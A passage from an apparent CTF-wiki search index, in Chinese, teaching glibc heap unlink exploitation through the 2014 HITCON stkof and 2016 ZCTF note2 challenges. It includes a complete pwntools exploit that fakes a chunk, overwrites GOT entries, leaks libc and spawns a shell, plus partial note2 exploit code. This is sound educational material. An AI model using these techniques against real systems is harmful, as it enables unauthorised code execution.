\u7684\u5730\u5740\u5904\u3002 \u800c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef \u6211\u4eec\u4f1a\u901a\u8fc7\u4e4b\u540e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u6211\u4eec\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6enext chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002","title":"\u5f53\u524d\u7684 unlink"},{"location":"pwn/heap/unlink/#2014-hitcon-stkof","text":"","title":"2014 HITCON stkof"},{"location":"pwn/heap/unlink/#_2","text":"\u279c 2014_hitcon_stkof git: ( master ) file stkof stkof: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped \u279c 2014_hitcon_stkof git: ( master ) checksec stkof [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u548c NX \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/unlink/#_3","text":"\u7a0b\u5e8f\u51e0\u4e4e\u5565\u8f93\u51fa\u4e5f\u6ca1\u6709\uff0c\u53ea\u80fd\u786c\u770b\u4e86\uff0c\u5927\u6982\u662f\u4e00\u4e2a\u5185\u5b58\u5206\u914d\u5668\uff0c\u5dee\u4e0d\u591a\u6709\u56db\u4e2a\u529f\u80fd 1\uff0c\u5206\u914d\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728bss\u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3aglobal\u3002 2\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u4ee5\u53ca\u6307\u5b9a\u5927\u5c0f\u5411\u6307\u5b9a\u5185\u5b58\u5904\uff0c\u8bfb\u5165\u6570\u636e\u3002 \u53ef\u89c1\uff0c\u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8bfb\u5165\u5b57\u8282\u7684\u5927\u5c0f\u662f\u7531\u6211\u4eec\u6765\u63a7\u5236\u7684\u3002 3\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757\u3002 4\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa\u3002\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/unlink/#_4","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b \u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc\u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002 *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd860 \u25c2\u2014 0x16 *R8 0x1 *R9 0x0 *R10 0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700 *R11 0x246 *R12 0xa *R13 0x9 R14 0x0 *R15 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RBP 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RSP 0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd18e0> ...\uff0c\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a8769c _IO_file_underflow+508 f 4 7ffff7a8860e _IO_default_uflow+14 f 5 7ffff7a7bc6a _IO_getline_info+170 f 6 7ffff7a7bd78 f 7 7ffff7a7ab7d fgets+173 f 8 400d2e f 9 7ffff7a2d830 __libc_start_main+240 \u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05410 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 PREV_INUSE { prev_size = 0, size = 134129, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05430 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20bd1 } 0xe05430 PREV_INUSE { prev_size = 0, size = 134097, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd1c0 \u25c2\u2014 0x16 R8 0x0 *R9 0x0 *R10 0x0 *R11 0x246 *R12 0x1 *R13 0x7fffffffd827 \u25c2\u2014 0x31 /* '1' */ R14 0x0 *R15 0x400de4 \u25c2\u2014 and eax, 0x2e000a64 /* '%d\\n' */ *RBP 0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284 *RSP 0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd2620> \u3002\u3002\u3002\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a878f8 _IO_file_overflow+456 f 4 7ffff7a8628d _IO_file_xsputn+173 f 5 7ffff7a5ae00 vfprintf+3216 f 6 7ffff7a62899 printf+153 f 7 4009cd f 8 400cb1 f 9 7ffff7a2d830 __libc_start_main+240 \u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05840 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x411 } 0xe05430 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05840 PREV_INUSE { prev_size = 0, size = 133057, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u53bb\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002 pwndbg> heap Top Chunk: 0x1e9b010 Last Remainder: 0 0x1e9a000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0x1e9b010 PREV_INUSE { prev_size = 0, size = 135153, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 }","title":"\u521d\u6b65\u6d4b\u8bd5"},{"location":"pwn/heap/unlink/#_5","text":"\u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002 \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b \u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a &global[2]-0x18\u3002 \u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a atoi@got \u5730\u5740\u3002 \u4fee\u6539 free@got \u4e3a puts@plt \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528 free \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002 free global[2]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002 \u4fee\u6539 atoi@got \u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u518d\u6b21\u8c03\u7528\u65f6\uff0c\u8f93\u5165 /bin/sh \u5730\u5740\u5373\u53ef\u3002 \u4ee3\u7801\u5982\u4e0b context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./stkof\" stkof = ELF ( './stkof' ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./stkof\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) head = 0x602140 def alloc ( size ): p . sendline ( '1' ) p . sendline ( str ( size )) p . recvuntil ( 'OK \\n ' ) def edit ( idx , size , content ): p . sendline ( '2' ) p . sendline ( str ( idx )) p . sendline ( str ( size )) p . send ( content ) p . recvuntil ( 'OK \\n ' ) def free ( idx ): p . sendline ( '3' ) p . sendline ( str ( idx )) def exp (): # trigger to malloc buffer for io function alloc ( 0x100 ) # idx 1 # begin alloc ( 0x30 ) # idx 2 # small chunk size in order to trigger unlink alloc ( 0x80 ) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64 ( 0 ) #prev_size payload += p64 ( 0x20 ) #size payload += p64 ( head + 16 - 0x18 ) #fd payload += p64 ( head + 16 - 0x10 ) #bk payload += p64 ( 0x20 ) # next chunk's prev_size bypass the check payload = payload . ljust ( 0x30 , 'a' ) # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64 ( 0x30 ) # make it believe that prev chunk is free payload += p64 ( 0x90 ) edit ( 2 , len ( payload ), payload ) # unlink fake chunk, so global[2] =&(global[2])-0x18=head-8 free ( 3 ) p . recvuntil ( 'OK \\n ' ) #gdb.attach(p) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64 ( stkof . got [ 'free' ]) + p64 ( stkof . got [ 'puts' ]) + p64 ( stkof . got [ 'atoi' ]) edit ( 2 , len ( payload ), payload ) # edit free@got to puts@plt payload = p64 ( stkof . plt [ 'puts' ]) edit ( 0 , len ( payload ), payload ) #free global[1] to leak puts addr free ( 1 ) puts_addr = p . recvuntil ( ' \\n OK \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) puts_addr = u64 ( puts_addr ) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc base: ' + hex ( libc_base )) log . success ( '/bin/sh addr: ' + hex ( binsh_addr )) log . success ( 'system addr: ' + hex ( system_addr )) # modify atoi@got to system addr payload = p64 ( system_addr ) edit ( 2 , len ( payload ), payload ) p . send ( p64 ( binsh_addr )) p . interactive () if __name__ == \"__main__\" : exp ()","title":"\u57fa\u672c\u601d\u8def"},{"location":"pwn/heap/unlink/#2016-zctf-note2","text":"","title":"2016 ZCTF note2"},{"location":"pwn/heap/unlink/#_6","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a \u6dfb\u52a0note\uff0csize\u9650\u5236\u4e3a0x80\uff0csize\u4f1a\u88ab\u8bb0\u5f55\uff0cnote\u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002 \u5c55\u793anote\u5185\u5bb9\u3002 \u7f16\u8f91note\u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684note\uff0c\u5728\u5df2\u6709\u7684note\u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002 \u91ca\u653enote\u3002 \u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898 \u5728\u6dfb\u52a0note\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55note\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6note\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u8bfb\u53d6\u7684\u5faa\u73af\u53d8\u91cfi\u662f\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u6240\u4ee5\u6bd4\u8f83\u65f6\u90fd\u4f1a\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165size\u4e3a0\u65f6\uff0cglibc\u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d0x20\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u7a0b\u5e8f\u8bfb\u53d6\u7684\u5185\u5bb9\u5374\u5e76\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002 \u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91note\u65f6\uff0c\u90fd\u4f1a\u7533\u8bf70xa0\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\u3002 \u7b2c\u4e00\u4e2a\u95ee\u9898\u5bf9\u5e94\u5728ida\u4e2d\u7684\u4ee3\u7801\u5982\u4e0b unsigned __int64 __fastcall ReadLenChar ( __int64 a1 , __int64 a2 , char a3 ) { char v4 ; // [sp+Ch] [bp-34h]@1 char buf ; // [sp+2Fh] [bp-11h]@2 unsigned __int64 i ; // [sp+30h] [bp-10h]@1 __int64 v7 ; // [sp+38h] [bp-8h]@2 v4 = a3 ; for ( i = 0LL ; a2 - 1 > i ; ++ i ) { v7 = read ( 0 , & buf , 1uLL ); if ( v7 <= 0 ) exit ( - 1 ); if ( buf == v4 ) break ; * ( _BYTE * )( i + a1 ) = buf ; } * ( _BYTE * )( a1 + i ) = 0 ; return i ; } \u5176\u4e2di\u662funsigned\u7c7b\u578b\uff0ca2\u4e3aint\u7c7b\u578b\uff0c\u6240\u4ee5\u4e24\u8005\u5728for\u5faa\u73af\u76f8\u6bd4\u8f83\u7684\u65f6\u5019\uff0ca2-1\u7684\u7ed3\u679c-1\u4f1a\u88ab\u89c6\u4e3aunsigned\u7c7b\u578b\uff0c\u6b64\u65f6\uff0c\u5373\u6700\u5927\u7684\u6574\u6570\u3002\u6240\u4ee5\u8bf4\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u4e5f\u5c31\u662f\u540e\u9762\u6211\u4eec\u6ea2\u51fa\u6240\u4f7f\u7528\u7684\u529e\u6cd5\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/heap/unlink/#_7","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002 \u4e0b\u9762\u4f9d\u6b21\u8fdb\u884c\u8bb2\u89e3\u3002","title":"\u57fa\u672c\u601d\u8def"},{"location":"pwn/heap/unlink/#_8","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u628anote\u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002 p = process ( './note2' ) note2 = ELF ( './note2' ) libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) context . log_level = 'debug' def newnote ( length , content ): p . recvuntil ( 'option--->>' ) p . sendline ( '1' ) p . recvuntil ( '(less than 128)' ) p . sendline ( str ( length )) p . recvuntil ( 'content:' ) p . sendline ( content ) def shownote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '2' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) def editnote ( id , choice , s ): p . recvuntil ( 'option--->>' ) p . sendline ( '3' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) p . recvuntil ( '2.append]' ) p . sendline ( str ( choice )) p . sendline ( s ) def deletenote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '4' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id ))","title":"\u57fa\u672c\u64cd\u4f5c"},{"location":"pwn/heap/unlink/#note","text":"\u8fd9\u4e00\u90e8\u5206\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b # chunk0: a fake chunk ptr = 0x0000000000602120 fakefd = ptr - 0x18 fakebk = ptr - 0x10 content = 'a' * 8 + p64 ( 0x61 ) + p64 ( fakefd ) + p64 ( fakebk ) + 'b' * 64 + p64 ( 0x60 ) #content = p64(fakefd) + p64(fakebk) newnote ( 128 , content ) # chunk1: a zero size chunk produce overwrite newnote ( 0 , 'a' * 8 ) # chunk2: a chunk to be overwrited and freed newnote ( 0x80 , 'b' * 16 ) \u5176\u4e2d\u8fd9\u4e09\u4e2anote\u7684\u5927\u5c0f\u5206\u522b\u4e3a0x80\uff0c0\uff0c0x80\uff0c\u7b2c\u4e8c\u4e2achunk\u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a0\uff0c\u4f46\u662fglibc\u7684\u8981\u6c42chunk\u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5(prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d0x20\u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5note\u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk1\u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2achunk chunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86unlink\u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002 chunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97unlink\u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe1\u6240\u793a\u3002 +-----------------+ high addr | ... | +-----------------+ | 'b'*8 | ptr[2]-----------> +-----------------+ | size=0x91 | +-----------------+ | prevsize | +-----------------+------------ | unused | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------+------------- | unused | +-----------------+ | prev_size=0x60 | fake ptr[0] chunk's nextchunk----->+-----------------+ | 64*'a' | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0x61 | chunk 0 +-----------------+ | 'a *8 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr \u56fe1","title":"\u751f\u6210\u4e09\u4e2anote"},{"location":"pwn/heap/unlink/#chunk1-chunk2-chunk2","text":"\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b # edit the chunk1 to overwrite the chunk2 deletenote ( 1 ) content = 'a' * 16 + p64 ( 0xa0 ) + p64 ( 0x90 ) newnote ( 0 , content ) # delete note 2 to trigger the unlink # after unlink, ptr[0] = ptr - 0x18 deletenote ( 2 ) \u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5chunk\u5c5e\u4e8efastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6chunk3\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe2\u6240\u793a\u3002 +-----------------+high addr | ... | +-----------------+ | '\\x00'+'b'*7 | ptr[2]-----------> +-----------------+ chunk 2 | size=0x90 | +-----------------+ | 0xa0 | +-----------------+------------ | 'a'*8 | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------+------------- | unused | +-----------------+ | prev_size=0x60 | fake ptr[0] chunk's nextchunk----->+-----------------+ | 64*'a' | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0x61 | chunk 0 +-----------------+ | 'a *8 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr \u56fe2 